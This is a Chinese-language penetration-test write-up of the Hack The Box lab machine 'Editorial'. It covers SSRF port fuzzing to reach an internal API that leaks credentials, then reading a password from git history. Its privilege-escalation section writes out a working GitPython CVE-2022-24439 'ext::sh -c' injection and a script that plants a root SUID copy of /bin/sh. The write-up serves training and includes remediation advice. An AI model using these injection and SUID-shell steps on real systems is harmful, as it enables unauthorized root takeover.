## 1. 執行摘要 (Executive Summary)

### 測試範圍與目標：
1. 靶機名稱:Editorial
2. 難度:Easy
3. IP:10.129.1.180

### 主要發現：
1. 漏洞 ：透過Web應用程式上的伺服器端請求偽造漏洞(SSRF)存取內部執行API中的洩漏憑證（風險等級：Critical）
2. 漏洞 ：枚舉Git倉庫的運行日誌可獲得更高權限使用者的明文憑證達成橫向移動(風險等級：High)
3. 漏洞 ：透過可以sudo權限運行的Python腳本中存在的函式庫公開漏洞(CVE-2022-24439)獲得root權限（風險等級：Critical）

### 攻擊鏈摘要：

Web應用程式存在伺服器端請求偽造漏洞(SSRF)，攻擊者利用此漏洞存取內部執行的API，進而取得憑證，最終獲得SSH機器的存取權限。枚舉系統可獲得Git倉庫中的運行日誌，其中包含其他使用者的明文密碼。在系統內存在可以sudo權限運行的Python腳本，其中存在的函式庫GitPython有公開漏洞(CVE-2022-24439)，利用即可獲得root權限。


### 潛在影響：

1. 伺服器端請求偽造漏洞(SSRF)將造成敏感資訊洩漏、系統控制權被奪取。
2. 攻擊者可透過Git倉庫憑證洩漏達成權限擴張，並有持久性威脅。
3. 以sudo權限執行具有公開漏洞的Python腳本將有root權限外洩、系統權限崩潰的危險，並會造成持久性威脅。


### 修復建議：

1. Web應用程式應使用正向清單，僅允許請求特定的協定、特定的網域或 IP 地址。
2. Web應用程式應進行輸入驗證與過濾，避免讓使用者直接輸入完整的URL。如果功能需要，應驗證URL格式，並過濾掉危險的URL scheme。
3. 應禁用重新導向跟隨，並對重要API採取網路隔離政策。
4. 立即失效與更換憑證，並清除Git歷史紀錄。
5. 立即更新受公開漏洞影響元件， 將GitPython升級至3.1.30或更高版本。
6. 移除不必要的sudo權限，評估該Python腳本是否真的需要root權限執行。

---

## 2. 技術發現與攻擊路徑詳述 (Findings)

### 2.1 資訊蒐集(Reconnaissance)

使用Nmap掃描開放埠
```bash
sudo nmap -sT -Pn --min-rate 10000 -p- 10.29.1.180
sudo nmap -sT -Pn -sV -sC -O -p22,80 10.29.1.180
sudo nmap -sT -Pn -sV -sC -O -p99,22,80 10.29.1.180
```
<img width="829" height="264" alt="螢幕擷取畫面 2026-03-07 215911" src="https://github.com/user-attachments/assets/7948a98f-1647-4631-896f-d6d743926a3a" />
<img width="973" height="427" alt="螢幕擷取畫面 2026-03-07 220109" src="https://github.com/user-attachments/assets/38556b73-8016-4046-a210-8ee6c25ba60b" />

因提示需要一關閉埠來對照掃描，故我增加99來對照

<img width="1117" height="475" alt="螢幕擷取畫面 2026-03-07 220244" src="https://github.com/user-attachments/assets/16edac64-c3ba-41fc-a387-9b9f0b4a8366" />

將網域存進/etc/hosts
```bash
sudo nano /etc/hosts
```
<img width="516" height="241" alt="螢幕擷取畫面 2026-03-07 220202" src="https://github.com/user-attachments/assets/048381a5-383b-434a-b213-9839468d39e1" />

探索80主頁，這裡看似簡單，其實我會檢查URL、原始碼、記住各種互動功能、檢查所有連結、將所有網站上的名詞整理成文檔、將圖片下載檢查內部資訊、檢查JS、用whatweb檢查網站、檢查各種看的到的東西，只是沒有特別的東西才沒截圖，否則會很長。

<img width="1580" height="888" alt="螢幕擷取畫面 2026-03-07 220318" src="https://github.com/user-attachments/assets/4ad6e066-45b0-4fd1-bddb-ddaefb6645a7" />
<img width="1604" height="856" alt="螢幕擷取畫面 2026-03-07 221404" src="https://github.com/user-attachments/assets/e249a2ad-23f9-4506-babd-dce5dcd7e563" />


### 2.2 枚舉(Enumeration)

使用Gobuster枚舉目錄，如果有明顯攻擊面(如此靶機)可只爆破一次，若無穩定攻擊面，可換工具、字典多次爆破，並對子目錄和子網域也進行爆破
```bash
sudo gobuster dir -u http://editorial.htb -w /usr/share/wordlists/dirb/common.txt -x php,txt
```
<img width="891" height="459" alt="螢幕擷取畫面 2026-03-07 222114" src="https://github.com/user-attachments/assets/eef43439-4e0f-4b76-b5ae-dc7fcd329db9" />


### 2.3 初始存取(Initial Access)

URL連結功能(SSRF)和檔案上傳功能(檔案上傳漏洞)是兩個不同的攻擊面，且這個頁面有"預覽"和"上傳"兩個按鈕，實戰時應全部試驗，這次幸運試第一次就成功(URL+預覽)

<img width="1604" height="856" alt="螢幕擷取畫面 2026-03-07 221404" src="https://github.com/user-attachments/assets/9581bb4e-0ee7-4663-916c-738e42e70080" />

隨意下載圖片

<img width="338" height="77" alt="螢幕擷取畫面 2026-03-07 225858" src="https://github.com/user-attachments/assets/59ae1257-1628-4bfa-bc9e-4812fd42d5f1" />

建立網路託管伺服器
```bash
python3 -m http.server 8000
```
<img width="582" height="127" alt="螢幕擷取畫面 2026-03-07 225920" src="https://github.com/user-attachments/assets/7d556716-4519-4b9f-bbd4-6663644c5534" />

填寫上傳表單

<img width="1472" height="544" alt="螢幕擷取畫面 2026-03-07 230103" src="https://github.com/user-attachments/assets/e2430f08-3ea7-4901-8a6e-328976275237" />

上傳後圖片出現預覽，且託管伺服器收到請求

<img width="1463" height="299" alt="螢幕擷取畫面 2026-03-07 230117" src="https://github.com/user-attachments/assets/18fb45a7-5292-4b59-a586-e0ae0e7050c6" />
<img width="684" height="119" alt="螢幕擷取畫面 2026-03-07 230130" src="https://github.com/user-attachments/assets/052af66e-460c-4f2f-bf50-8ab7279ee825" />

利用Burp Suite攔截POST請求

<img width="1173" height="502" alt="螢幕擷取畫面 2026-03-07 230443" src="https://github.com/user-attachments/assets/6ad38dff-41fe-4caa-bd51-d931798dc896" />

檢查回應中的URL，瀏覽器自動下載了上傳的圖片

<img width="1550" height="462" alt="螢幕擷取畫面 2026-03-07 230511" src="https://github.com/user-attachments/assets/47ffad9f-2cde-4ce8-aee0-f50a146e8b71" />
<img width="804" height="553" alt="螢幕擷取畫面 2026-03-07 230524" src="https://github.com/user-attachments/assets/e246cde7-3b2a-4a39-a17b-3db2f9c125ab" />

檢查是否存在SSRF，最小PoC是更改為本地127.0.0.1，看是否請求成功

<img width="1153" height="518" alt="螢幕擷取畫面 2026-03-07 230901" src="https://github.com/user-attachments/assets/bd6f2095-e07d-4ad6-b358-c547354fa869" />

檢查回應來的URL，是佔位圖片，確認有SSRF

<img width="1020" height="737" alt="螢幕擷取畫面 2026-03-07 230927" src="https://github.com/user-attachments/assets/c1d0b010-0391-4196-a281-52d36317e70f" />

利用網路資源建立簡單top100 ports的小字典準備爆破

<img width="1782" height="662" alt="螢幕擷取畫面 2026-03-07 231208" src="https://github.com/user-attachments/assets/b56e0da3-d5c8-4f07-86d0-24a582cae7b9" />

利用Burp Suite進行爆破

<img width="1373" height="713" alt="螢幕擷取畫面 2026-03-07 232552" src="https://github.com/user-attachments/assets/a2ed6492-7665-4fa4-9d02-c729e5d3b163" />

確認5000port是唯一回應長度不一樣的，有延遲的也檢查了，並未有發現

<img width="1260" height="612" alt="螢幕擷取畫面 2026-03-07 233052" src="https://github.com/user-attachments/assets/72287c20-911f-4205-98af-a72122c92fba" />
<img width="1244" height="633" alt="螢幕擷取畫面 2026-03-07 233108" src="https://github.com/user-attachments/assets/20d03c06-7dd6-48fe-8787-d57fb9547664" />

補充:完整65535ports爆破

注意，實戰中如此大量的爆破可能被封鎖IP、示警管理員導致行動暴露，或伺服器端發生故障，若非必要，請使用小字典即可，在此為演示用

建立1~65535的大字典
```bash
seq 1 65535 > 65535
wc -l 65535
```
<img width="451" height="215" alt="螢幕擷取畫面 2026-03-07 233419" src="https://github.com/user-attachments/assets/62ac3305-20df-4ef8-97a0-7d33e4bc447c" />

將請求複製成文檔，並在port的位置添加FUZZ

<img width="1078" height="470" alt="螢幕擷取畫面 2026-03-07 233530" src="https://github.com/user-attachments/assets/4fd1593a-22ba-439a-8db0-a565c919cace" />

使用ffuf進行模糊測試
1. 注意，一開始不要設過濾，先跑個幾秒，確認前幾位長度(Size)都一樣再停止並設定參數，將長度相同者過濾掉
2. 要記得使用-request-proto參數指定請求類行為http
```bash
sudo ffuf -request request -request-proto http -w 65535 -fs 61
```
<img width="1282" height="536" alt="螢幕擷取畫面 2026-03-07 233925" src="https://github.com/user-attachments/assets/6cf18735-98a0-41de-b434-f42a5d087561" />
<img width="883" height="239" alt="螢幕擷取畫面 2026-03-07 234900" src="https://github.com/user-attachments/assets/dd76418d-1898-412c-aa0b-fa79be80bc4a" />

檢查5000port的回應，回應只要瀏覽過一次即失效，每次瀏覽都須重新取得回應
```bash
sudo curl -s http://... | jq .
```
<img width="1908" height="143" alt="螢幕擷取畫面 2026-03-07 234516" src="https://github.com/user-attachments/assets/83309c2f-28aa-47ed-bf72-0658255196e3" />
<img width="887" height="737" alt="螢幕擷取畫面 2026-03-07 234701" src="https://github.com/user-attachments/assets/27856787-2b2e-48a9-9fa2-6eb76a9249a3" />

在authors的API端點取得使用者憑證

<img width="1316" height="711" alt="螢幕擷取畫面 2026-03-07 234946" src="https://github.com/user-attachments/assets/61ae80d2-09d9-4bf1-a6b0-699992509c4b" />
<img width="1216" height="250" alt="螢幕擷取畫面 2026-03-07 235247" src="https://github.com/user-attachments/assets/9c7ec9ec-baaa-4a71-95a5-cbc226d57230" />

利用ssh連線成功

<img width="777" height="754" alt="螢幕擷取畫面 2026-03-07 235338" src="https://github.com/user-attachments/assets/b3d5e79e-bfda-44a8-aae3-3729515c9666" />

取得user.txt

<img width="392" height="189" alt="螢幕擷取畫面 2026-03-07 235502" src="https://github.com/user-attachments/assets/c64215cd-8353-443f-a6e0-57d84aee6cce" />



### 2.4 橫向移動(Lateral Movement)

(經過提權枚舉無果後)遍歷目錄發現/.git

<img width="638" height="706" alt="螢幕擷取畫面 2026-03-07 235727" src="https://github.com/user-attachments/assets/ed53d35a-ff6f-464d-bd3f-10f648c39c1d" />

列出運行日誌後，在其中發現可疑條目
```bash
git log
```
<img width="719" height="743" alt="螢幕擷取畫面 2026-03-07 235948" src="https://github.com/user-attachments/assets/aaea8ee0-89bf-4fdc-b531-155c71d2104a" />

檢查可以條目，可得使用者憑證
```bash
git show b73......
```
<img width="1913" height="493" alt="螢幕擷取畫面 2026-03-08 000054" src="https://github.com/user-attachments/assets/0657873e-2987-4552-8990-0a824bbf4c89" />

使用ssh登入成功

<img width="1079" height="677" alt="螢幕擷取畫面 2026-03-08 000622" src="https://github.com/user-attachments/assets/d21ae905-119a-46c3-82af-89636e4463d7" />


### 2.5 權限提升(Privilege Escalation)

檢查sudo權限
```bash
sudo -l
```
<img width="1146" height="181" alt="螢幕擷取畫面 2026-03-08 000708" src="https://github.com/user-attachments/assets/498147be-0560-4358-b05f-b140778c399d" />

檢查py腳本權限和內容

<img width="1159" height="442" alt="螢幕擷取畫面 2026-03-08 001221" src="https://github.com/user-attachments/assets/4a0efafc-73ed-4ffb-8c93-158fc89b61dc" />

檢查git函式庫版本
```bash
python3 -c 'import git;prtin(git.__file__)'
head -n 20 /usr/.../__init__.py
```
<img width="772" height="439" alt="螢幕擷取畫面 2026-03-08 001558" src="https://github.com/user-attachments/assets/e5c81d3f-f625-4da1-bb31-9c509addaed5" />

確認該版本有公開漏洞

<img width="934" height="819" alt="螢幕擷取畫面 2026-03-08 001702" src="https://github.com/user-attachments/assets/faaca2af-4da4-4d11-b428-6999690fd0f5" />
<img width="958" height="690" alt="螢幕擷取畫面 2026-03-08 002444" src="https://github.com/user-attachments/assets/ad5e6f20-cb38-48ba-af2b-71e979593644" />

檢查PoC
```bash
sudo python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c touch% /tmp/pwned'
```
<img width="1054" height="397" alt="螢幕擷取畫面 2026-03-08 002941" src="https://github.com/user-attachments/assets/973b00a2-f02c-4368-a3f0-770d8f2e6f25" />

確實執行了touch命令，PoC可用

ext是在Git語境下的一種遠端輔助程式，普通的Git協定（如 http:// 或 ssh://）是Git內建處理的。

如果使用ext::前綴，Git會停止的邏輯傳輸，啟動外部指令，再將內部的資料流丟給外部處理，攻擊者可以此達成遠端程式碼執行，若使用sudo權限執行即可提權。

<img width="293" height="64" alt="螢幕擷取畫面 2026-03-08 002950" src="https://github.com/user-attachments/assets/b5d8ca79-151b-4689-b3aa-e622d3d0986d" />
<img width="497" height="45" alt="螢幕擷取畫面 2026-03-08 003026" src="https://github.com/user-attachments/assets/bfb9572e-acdd-4568-bcca-959db54f5e33" />

將提權邏輯寫入腳本，並賦予使用權限，腳本存在/dev/shm

/dev/shm是直接放在記憶體中，速度很快但重啟後會清空；/tmp是在硬碟，速度較慢，適合臨時存儲。如果/tmp走不通可以用/dev/shm，如本靶機。

腳本內容是將/bin/sh複製到/tmp目錄下並改名為proof，使用chown命令指定所有者/組為root，並賦予最高權限。再利用sudo權限呼叫腳本，就可以獲得一個檔案/tmp/proof有/bin/sh能力，再執行它即可。
```bash
echo -e '#!/bin/bash\n\ncp /bin/sh /tmp/proof\nchown root:root /tmp/proof\nchmod 6777 /tmp/proof' > /dev/shm/proof.sh
chmod +x /dev/shm/proof.sh
```
```bash
#!/bin/bash
                                                    
cp /bin/sh /tmp/proof      
chown root:root /tmp/proof
chmod 6777 /tmp/proof
```

<img width="1293" height="192" alt="螢幕擷取畫面 2026-03-08 005858" src="https://github.com/user-attachments/assets/54122e6f-72a9-4366-8498-67191845ce5e" />

執行Payload，注意，如果是用複製貼上PoC，記得把其中的touch命令刪除掉
```bash
sudo python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c /dev/shm/proof.sh'
```
<img width="1152" height="376" alt="螢幕擷取畫面 2026-03-08 010203" src="https://github.com/user-attachments/assets/835323d4-1cb3-4e6f-b2e4-7d697c0d146d" />

/tmp/proof確實建立

<img width="518" height="81" alt="螢幕擷取畫面 2026-03-08 010213" src="https://github.com/user-attachments/assets/dee4f047-ed4c-47a1-82d9-893cb34d1ae4" />

使用-p參數執行，提權成功

<img width="375" height="77" alt="螢幕擷取畫面 2026-03-08 010250" src="https://github.com/user-attachments/assets/ce981d85-00ef-4ecf-a504-1ff4f2b51c4f" />




### 2.6 最終成果(Impact)


獲得root.txt

<img width="1033" height="225" alt="螢幕擷取畫面 2026-03-08 010401" src="https://github.com/user-attachments/assets/a94cfcc6-cb5e-40dd-a93d-54fcb9d98661" />


---

## 3. 學習回顧 (Lessons Learned)

### 成功的部分：

1. SSRF的練習機會不多，這次相對來說比較簡單。
2. 關於提權邏輯，我有嘗試過命令注入獲取反彈Shell，但我失敗了，最後才轉戰使用腳本。

### 浪費時間的部分：

1. 這次靶機還算順利，沒有特別卡住的地方。

### 新知識點：

1. Git函數庫的ext::利用，我後來翻閱資料學到很多。

### 與實戰對應：

1. SSRF爆破時請勿一次就用大字典，可能會造成許多不可控制的後果。
2. git的探索真的是重中之重。

